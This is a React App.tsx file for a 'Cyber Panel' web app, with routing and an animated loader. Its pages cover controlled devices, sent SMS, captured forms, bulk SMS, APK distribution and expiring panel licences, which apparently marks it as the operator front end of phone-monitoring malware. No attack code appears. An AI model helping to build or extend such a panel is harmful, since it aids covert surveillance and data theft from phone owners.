import { useState, useEffect } from "react";
import { AnimatePresence, motion } from "framer-motion";

import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Route, Routes } from "react-router-dom";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import { onAuthStateChanged, signOut } from "@/lib/authPb";
import { auth } from "@/lib/firebase";
import { validateSession, clearLocalSessionToken, getLocalSessionToken } from "@/lib/session";
import { getActiveAccountId, switchToDefault } from "@/lib/multiAccount";
import { getStoredUser } from "@/lib/apiClient";
import BottomNav from "@/components/BottomNav";
import DesktopSidebar from "@/components/DesktopSidebar";
import Index from "./pages/Index.tsx";
import DevicesPage from "./pages/DevicesPage.tsx";
import MessagesPage from "./pages/MessagesPage.tsx";
import SettingsPage from "./pages/SettingsPage.tsx";
import NotFound from "./pages/NotFound.tsx";
import LoginPage from "./pages/LoginPage.tsx";
import PublicDeviceView from "./pages/PublicDeviceView.tsx";
import ManageLinksPage from "./pages/ManageLinksPage.tsx";
import AllSentSmsPage from "./pages/AllSentSmsPage.tsx";
import CustomizePage from "./pages/CustomizePage.tsx";
import AboutPage from "./pages/AboutPage.tsx";
import LoginHistoryPage from "./pages/LoginHistoryPage.tsx";
import MagicClearPage from "./pages/MagicClearPage.tsx";
import MagicScanPage from "./pages/MagicScanPage.tsx";
import ProfilePage from "./pages/ProfilePage.tsx";
import ExportDataPage from "./pages/ExportDataPage.tsx";
import HelpPage from "./pages/HelpPage.tsx";
import AllFormsPage from "./pages/AllFormsPage.tsx";
import FoxDevPage from "./pages/FoxDevPage.tsx";
import AddAccountPage from "./pages/AddAccountPage.tsx";
import EditAccountPage from "./pages/EditAccountPage.tsx";
import BulkSmsPage from "./pages/BulkSmsPage.tsx";
import ApksPage from "./pages/ApksPage.tsx";
import AdminPanelPage from "./pages/AdminPanelPage.tsx";
import { Loader2 } from "lucide-react";
import { usePanelConfig } from "@/hooks/usePanelConfig";
import PanelExpiredScreen from "@/components/PanelExpiredScreen";
import PanelSetupScreen from "@/components/PanelSetupScreen";

const queryClient = new QueryClient();

const FullscreenLoader = () => {
  const activeId = getActiveAccountId();
  const accountName = activeId
    ? (() => {
        try {
          const stored = sessionStorage.getItem("dxp_switched_pb_config");
          if (stored) {
            const parsed = JSON.parse(stored) as { baseUrl?: string };
            if (parsed.baseUrl) {
              try {
                return new URL(parsed.baseUrl).hostname || "Account";
              } catch {
                return "Account";
              }
            }
          }
        } catch {}
        return "Account";
      })()
    : null;
  const defaultName = localStorage.getItem("dxp_default_panel_name") || "Panel";
  const displayName = activeId ? accountName : defaultName;

  return (
    <motion.div
      className="min-h-screen flex flex-col items-center justify-center bg-white gap-6 overflow-hidden"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0, scale: 0.95 }}
      transition={{ duration: 0.4 }}
    >
      {/* Ambient glow */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <motion.div
          className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[300px] h-[300px] rounded-full bg-primary/10 blur-[100px]"
          animate={{ scale: [1, 1.3, 1], opacity: [0.15, 0.3, 0.15] }}
          transition={{ duration: 3, repeat: Infinity, ease: "easeInOut" }}
        />
      </div>

      {/* Shield / Logo */}
      <motion.div
        className="relative z-10"
        initial={{ scale: 0.5, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        transition={{ type: "spring", stiffness: 200, damping: 20, delay: 0.1 }}
      >
        <div className="h-20 w-20 rounded-3xl bg-gradient-to-br from-primary via-primary/80 to-primary/50 flex items-center justify-center shadow-2xl shadow-primary/30 relative">
          <motion.div
            className="absolute inset-0 rounded-3xl border-2 border-primary/40"
            animate={{ scale: [1, 1.15, 1], opacity: [0.5, 0, 0.5] }}
            transition={{ duration: 2, repeat: Infinity, ease: "easeInOut" }}
          />
          <svg className="h-9 w-9 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
          </svg>
        </div>
      </motion.div>

      {/* Title */}
      <motion.div
        className="relative z-10 text-center space-y-2"
        initial={{ y: 15, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        transition={{ delay: 0.3, duration: 0.5 }}
      >
        <h1 className="text-xl font-black tracking-tight text-neutral-900">
          Cyber <span className="text-primary">Panel</span>
        </h1>
        <p className="text-[11px] text-neutral-400 font-medium tracking-widest uppercase">
          {activeId ? "Logging into" : "Loading"}
        </p>
        <p className="text-[13px] font-bold text-neutral-700 mt-1">{displayName}</p>
      </motion.div>

      {/* Animated dots */}
      <motion.div
        className="relative z-10 flex items-center gap-1.5"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.5 }}
      >
        {[0, 1, 2].map((i) => (
          <motion.div
            key={i}
            className="h-2 w-2 rounded-full bg-primary"
            animate={{ scale: [1, 1.4, 1], opacity: [0.4, 1, 0.4] }}
            transition={{ duration: 1, repeat: Infinity, delay: i * 0.2, ease: "easeInOut" }}
          />
        ))}
      </motion.div>
    </motion.div>
  );
};

const PanelShell = ({ onLogout }: { onLogout: () => Promise<void> }) => {
  const { config, loading, isExpired, isConfigured } = usePanelConfig();

  if (loading) {
    return <FullscreenLoader />;
  }

  if (!isConfigured) {
    return <PanelSetupScreen />;
  }

  if (isExpired) {
    return <PanelExpiredScreen adminName={config.admin_name} expiryDate={config.expiry_date} />;
  }

  return (
    <div className="flex min-h-screen">
      <DesktopSidebar />
      <div className="flex-1 min-w-0">
        <Routes>
          <Route path="/view/:deviceId" element={<PublicDeviceView />} />
          <Route path="/" element={<Index />} />
          <Route path="/devices" element={<DevicesPage />} />
          <Route path="/messages" element={<MessagesPage />} />
          <Route path="/settings" element={<SettingsPage onLogout={onLogout} />} />
          <Route path="/manage-links" element={<ManageLinksPage />} />
          <Route path="/all-sent-sms" element={<AllSentSmsPage />} />
          <Route path="/all-forms" element={<AllFormsPage />} />
          <Route path="/customize" element={<CustomizePage />} />
          <Route path="/about" element={<AboutPage />} />
          <Route path="/login-history" element={<LoginHistoryPage />} />
          <Route path="/magic-clear" element={<MagicClearPage />} />
          <Route path="/magic-scan" element={<MagicScanPage />} />
          <Route path="/profile" element={<ProfilePage />} />
          <Route path="/export-data" element={<ExportDataPage />} />
          <Route path="/help" element={<HelpPage />} />
          <Route path="/fox-dev" element={<FoxDevPage />} />
          <Route path="/add-account" element={<AddAccountPage />} />
          <Route path="/edit-account/:accountId" element={<EditAccountPage />} />
          <Route path="/bulk-sms" element={<BulkSmsPage />} />
          <Route path="/apks" element={<ApksPage />} />
          <Route path="*" element={<NotFound />} />
        </Routes>
        <BottomNav />
      </div>
    </div>
  );
};

const AuthenticatedApp = ({ onLogout }: { onLogout: () => Promise<void> }) => {
  // Superadmin gets the dedicated /admin shell. We check this BEFORE entering
  // PanelShell so we don't fire panel-scope RTDB polls with an admin-scope JWT
  // (which would 403 on every poll).
  const storedUser = getStoredUser();
  const isSuperadmin = storedUser?.role === "superadmin";

  if (isSuperadmin) {
    return (
      <Routes>
        <Route path="*" element={<AdminPanelPage onLogout={onLogout} />} />
      </Routes>
    );
  }

  return <PanelShell onLogout={onLogout} />;
};

const PublicApp = () => (
  <Routes>
    <Route path="/view/:deviceId" element={<PublicDeviceView />} />
    <Route path="*" element={<LoginPage />} />
  </Routes>
);

const RestrictedApp = ({ deviceId, onLogout }: { deviceId: string; onLogout: () => Promise<void> }) => {
  return (
    <Routes>
      <Route path="*" element={<PublicDeviceView restrictedDeviceId={deviceId} onLogout={onLogout} />} />
    </Routes>
  );
};

const AppContent = () => {
  const [authed, setAuthed] = useState<boolean | null>(null);
  const [restrictedDeviceId, setRestrictedDeviceId] = useState<string | null>(null);

  useEffect(() => {
    let isMounted = true;

    const unsub = onAuthStateChanged(auth, async (user) => {
      if (!isMounted) return;

      if (!user) {
        // Switched-account auto-relogin removed: every login now requires TOTP.
        // If a switched profile is active without a valid token, drop back to default.
        if (getActiveAccountId()) await switchToDefault();
        setAuthed(false);
        setRestrictedDeviceId(null);
        return;
      }

      const email = user.email || "";
      if (email.includes("@temp.cyberpanel.dev") || email.includes("@temp.darkxpanel.dev")) {
        const match = email.match(/^link_(.+?)_[^@]+@temp\.(?:cyberpanel|darkxpanel)\.dev$/);
        if (match) setRestrictedDeviceId(match[1]);
      } else {
        setRestrictedDeviceId(null);
      }

      setAuthed(true);

      const localToken = getLocalSessionToken();
      if (!localToken) return;

      void validateSession()
        .then((result) => {
          if (!isMounted) return;
          if (result === "invalid") {
            clearLocalSessionToken();
            void signOut(auth);
            setAuthed(false);
          }
        })
        .catch(() => {});
    });

    return () => {
      isMounted = false;
      unsub();
    };
  }, []);

  const handleLogout = async () => {
    clearLocalSessionToken();
    await signOut(auth);
  };

  if (authed === null) {
    return <FullscreenLoader />;
  }

  if (authed && restrictedDeviceId) {
    return <RestrictedApp deviceId={restrictedDeviceId} onLogout={handleLogout} />;
  }

  return authed ? <AuthenticatedApp onLogout={handleLogout} /> : <PublicApp />;
};

const App = () => (
  <QueryClientProvider client={queryClient}>
    <TooltipProvider>
      <Toaster />
      <Sonner />
      <BrowserRouter>
        <AppContent />
      </BrowserRouter>
    </TooltipProvider>
  </QueryClientProvider>
);

export default App;
